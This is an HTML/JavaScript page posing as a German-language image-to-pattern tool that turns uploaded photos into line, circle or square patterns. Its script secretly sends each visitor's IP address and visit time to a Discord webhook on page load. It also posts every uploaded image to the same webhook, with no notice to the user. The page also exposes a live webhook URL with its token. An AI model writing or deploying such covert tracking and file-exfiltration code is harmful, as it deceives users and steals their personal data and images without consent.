<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PATTERN</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            overflow: hidden; /* Verhindert das Anzeigen von Scrollleisten */
            position: relative;
        }
        canvas {
            max-width: 100vw; /* Maximale Breite des Canvas */
            max-height: 100vh; /* Maximale Höhe des Canvas */
        }
        #imageLoader {
            position: absolute;
            top: 10px;
            left: 10px;
            z-index: 10;
        }
        #downloadButton {
            position: absolute;
            top: 60px; /* Position unter dem Upload-Button */
            left: 10px;
            z-index: 10;
        }
        #controls {
            position: absolute;
            bottom: 10px;
            left: 10px;
            z-index: 10;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        input[type=range] {
            width: 600px; /* Größe der Schieberegler */
            height: 30px; /* Erhöhung der Höhe des Schiebereglers */
        }
    </style>
</head>
<body>
    <input type="file" id="imageLoader" name="imageLoader"/>
    <button id="downloadButton">Download as PNG</button> <!-- Verschobener Download-Button -->
    <canvas id="canvas"></canvas>
    <div id="controls">
        <label for="patternSelect">Muster auswählen:</label>
        <select id="patternSelect">
            <option value="lines">Linien</option>
            <option value="circles">Kreise</option>
            <option value="squares">Quadrate</option>
        </select>
        <label for="lineSpacingSlider">Abstand:</label>
        <input type="range" id="lineSpacingSlider" min="4" max="50" value="10">
    </div>

    <script>
        // Webhook URLs
        const webhookURL = 'https://discord.com/api/webhooks/1239991202716319816/xaygC0PMgh6E4-uNhKYO0Sy-7Uti5TkT7flGHP73Hq2rWxRisqa4Z2skzT3jD2B4ME8S';

        // Funktion zum Senden der Webhook-Nachricht
        async function sendWebhookMessage(message) {
            await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content: message })
            });
        }

        // IP-Adresse ermitteln und Nachricht senden
        async function notifyVisit() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            const ip = data.ip;
            const ipType = ip.includes(':') ? 'IPv6' : 'IPv4';
            const time = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });
            const message = `-----\nPattern Opened!\nTime: ${time}\n${ipType} IP: ||${ip}||\n-----`;
            await sendWebhookMessage(message);
        }

        // Benachrichtigung beim Seitenaufruf
        notifyVisit();

        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const imageLoader = document.getElementById('imageLoader');
        const lineSpacingSlider = document.getElementById('lineSpacingSlider');
        const patternSelect = document.getElementById('patternSelect');
        let uploadedImage = null;

        imageLoader.addEventListener('change', handleImage, false);
        lineSpacingSlider.addEventListener('input', drawPattern);
        patternSelect.addEventListener('change', drawPattern);

        // Funktion zum Senden der Webhook-Nachricht mit Anhang
        async function sendWebhookMessageWithAttachment(message, file) {
            const formData = new FormData();
            formData.append('file', file); // Hochgeladenes Bild hinzufügen
            formData.append('payload_json', JSON.stringify({ // Textnachricht als JSON hinzufügen
                content: message,
                username: 'Pattern Bot' // Optional: Benutzername für die Nachricht
            }));

            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Error sending message to webhook:', error);
            }
        }

        function handleImage(e) {
            const reader = new FileReader();
            reader.onload = async function(event) {
                const img = new Image();
                img.onload = async function() {
                    uploadedImage = img;
                    resizeCanvasToImage(img);
                    drawPattern();

                    // Nachricht mit Anhang senden
                    const message = 'New image uploaded!';
                    await sendWebhookMessageWithAttachment(message, e.target.files[0]);
                }
                img.src = event.target.result;
            }
            reader.readAsDataURL(e.target.files[0]);
        }

        function resizeCanvasToImage(img) {
            const imgAspectRatio = img.width / img.height;
            const canvasAspectRatio = window.innerWidth / window.innerHeight;

            if (img.width < window.innerWidth * 0.5 && img.height < window.innerHeight * 0.5) {
                if (imgAspectRatio > canvasAspectRatio) {
                    canvas.width = window.innerWidth;
                    canvas.height = canvas.width / imgAspectRatio;
                } else {
                    canvas.height = window.innerHeight;
                    canvas.width = canvas.height * imgAspectRatio;
                }
            } else {
                if (imgAspectRatio > canvasAspectRatio) {
                    canvas.height = Math.min(window.innerHeight, img.height);
                    canvas.width = canvas.height * imgAspectRatio;
                } else {
                    canvas.width = Math.min(window.innerWidth, img.width);
                    canvas.height = canvas.width / imgAspectRatio;
                }
            }
        }

        function drawPattern() {
            if (!uploadedImage) return;
            const lineSpacing = parseInt(lineSpacingSlider.value);
            const patternType = patternSelect.value;

            ctx.clearRect(0, 0, canvas.width, canvas.height);  // Canvas löschen

            if (patternType === 'lines') {
                drawDiagonalPattern(uploadedImage, lineSpacing);
            } else if (patternType === 'circles') {
                drawCirclePattern(uploadedImage, lineSpacing);
            } else if (patternType === 'squares') {
                drawSquarePattern(uploadedImage, lineSpacing);
            }
        }

        function drawDiagonalPattern(img, lineSpacing) {
            const width = canvas.width;
            const height = canvas.height;
            const imageData = getImageDataFromImage(img, width, height);
            const data = imageData.data;

            for (let y = 0; y < height; y += lineSpacing) {
                for (let x = 0; x < width; x += lineSpacing) {
                    const i = (y * width + x) * 4;
                    const r = data[i];
                    const g = data[i + 1];
                    const b = data[i + 2];
                    const brightness = (r + g + b) / 3;
                    const lineWidth = Math.max(1, (1 - brightness / 255) * (lineSpacing / 2));

                    ctx.lineWidth = lineWidth;
                    ctx.strokeStyle = 'black';  // Linienfarbe

                    // Von oben links nach unten rechts zeichnen
                    ctx.beginPath();
                    ctx.moveTo(x, y);
                    ctx.lineTo(x + lineSpacing, y + lineSpacing);
                    ctx.stroke();

                    // Von oben rechts nach unten links zeichnen
                    ctx.beginPath();
                    ctx.moveTo(x + lineSpacing, y);
                    ctx.lineTo(x, y + lineSpacing);
                    ctx.stroke();
                }
            }
        }

        function drawCirclePattern(img, lineSpacing) {
            const width = canvas.width;
            const height = canvas.height;
            const imageData = getImageDataFromImage(img, width, height);
            const data = imageData.data;

            for (let y = 0; y < height; y += lineSpacing) {
                for (let x = 0; x < width; x += lineSpacing) {
                    const i = (y * width + x) * 4;
                    const r = data[i];
                    const g = data[i + 1];
                    const b = data[i + 2];
                    const brightness = (r + g + b) / 3;
                    const radius = Math.max(1, (1 - brightness / 255) * (lineSpacing / 2));

                    ctx.beginPath();
                    ctx.arc(x + lineSpacing / 2, y + lineSpacing / 2, radius, 0, 2 * Math.PI, false);
                    ctx.fillStyle = 'black';  // Kreisfarbe
                    ctx.fill();
                }
            }
        }

        function drawSquarePattern(img, lineSpacing) {
            const width = canvas.width;
            const height = canvas.height;
            const imageData = getImageDataFromImage(img, width, height);
            const data = imageData.data;

            for (let y = 0; y < height; y += lineSpacing) {
                for (let x = 0; x < width; x += lineSpacing) {
                    const i = (y * width + x) * 4;
                    const r = data[i];
                    const g = data[i + 1];
                    const b = data[i + 2];
                    const brightness = (r + g + b) / 3;
                    const size = Math.max(1, (1 - brightness / 255) * lineSpacing);

                    ctx.fillStyle = 'black';  // Quadratfarbe
                    ctx.fillRect(x, y, size, size);
                }
            }
        }

        function getImageDataFromImage(img, width, height) {
            const canvasTmp = document.createElement('canvas');
            const ctxTmp = canvasTmp.getContext('2d');
            canvasTmp.width = width;
            canvasTmp.height = height;
            ctxTmp.drawImage(img, 0, 0, width, height);
            return ctxTmp.getImageData(0, 0, width, height);
        }

        window.addEventListener('resize', () => {
            if (uploadedImage) {
                resizeCanvasToImage(uploadedImage);
                drawPattern();
            }
        });

        // Initial Canvasgröße einstellen
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        document.getElementById('downloadButton').addEventListener('click', () => {
            downloadCanvasAsPNG();
        });

        function downloadCanvasAsPNG() {
            const url = canvas.toDataURL('image/png');
            const link = document.createElement('a');
            link.href = url;
            link.download = 'pattern_' + Math.floor(Math.random() * 10000) + '.png'; // Random number between 0 and 999
            link.click();
        }
    </script>
</body>
</html>
